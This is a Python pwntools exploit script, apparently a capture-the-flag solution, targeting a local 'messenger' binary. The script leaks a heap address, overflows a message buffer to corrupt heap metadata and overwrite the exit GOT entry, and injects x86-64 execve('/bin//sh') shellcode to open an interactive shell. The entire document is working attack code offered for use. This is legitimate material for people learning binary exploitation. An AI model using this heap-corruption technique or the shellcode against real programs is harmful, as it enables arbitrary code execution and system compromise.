# http://nextline.tistory.com/115
from pwn import *

s = process('./messenger')
e = ELF('./messenger')

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05\x00"

def first(msg):
	s.recvuntil('>> ')
	s.sendline(msg)

def send_msg(msg):
	s.recvuntil(': ')
	s.sendline(msg)

def leak():
	first('L')
	send_msg('8')
	send_msg('a')

	first('L')
	send_msg('25')
	send_msg(shellcode)

	first('C')
	send_msg('0')
	send_msg('32')
	send_msg('A' * 31)

	first('V')
	send_msg('0')

	s.recvline()
	return u32(s.recvline()[0:4])

def exploit(leak):
	first('C')
	send_msg('0')
	send_msg('49')

	payload_2 = 'A' * 24
	payload_2 += '\x30' + '\x00' * 7
	payload_2 +=  p64(leak - 0x60) + p64((e.got['exit'] - 0x8))

	send_msg(payload_2)
	print "LEAK ADD : " + hex(leak)

	first('R')
	send_msg('1')

	first('C')
	send_msg('0')
	send_msg('25')
	send_msg(shellcode)

	first('V')
	send_msg('0')

	first('l')
	s.interactive()

def main():
	leak_1 = leak()
	exploit(leak_1)

if __name__ == "__main__":
	main()
